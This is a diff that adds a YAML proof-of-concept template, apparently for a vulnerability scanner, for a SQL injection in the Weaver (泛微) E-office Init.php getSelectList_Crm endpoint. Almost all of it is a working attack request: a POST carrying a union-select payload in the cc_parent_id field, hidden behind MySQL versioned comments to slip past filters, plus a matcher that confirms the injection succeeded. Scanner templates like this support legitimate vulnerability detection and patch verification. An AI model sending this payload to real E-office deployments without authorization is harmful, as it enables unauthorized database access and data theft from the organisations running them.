@@ -1,0 +1,24 @@
+id: poc-yaml-weaver-e-office-getSelectList-sqli
+info:
+  name: 泛微 E-office 办公系统 Init.php getSelectList_Crm SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: e-office
+variables:
+  v1: random_int(1000,10000)
+requests:
+- method: POST
+  path: /E-mobile/App/Init.php?m=getSelectList_Crm
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cc_parent_id=-999 /*!50000union*/ /*!50000all*/ /*!50000select*/ 1,(/*!50000select*/
+    md5({{.v1}}))#
+  expression: 'status_code == 200
+
+    && contains(body, "\"CC_VALUE\":\"")
+
+    && contains(body, md5(v1))
+
+    '
+transport: http
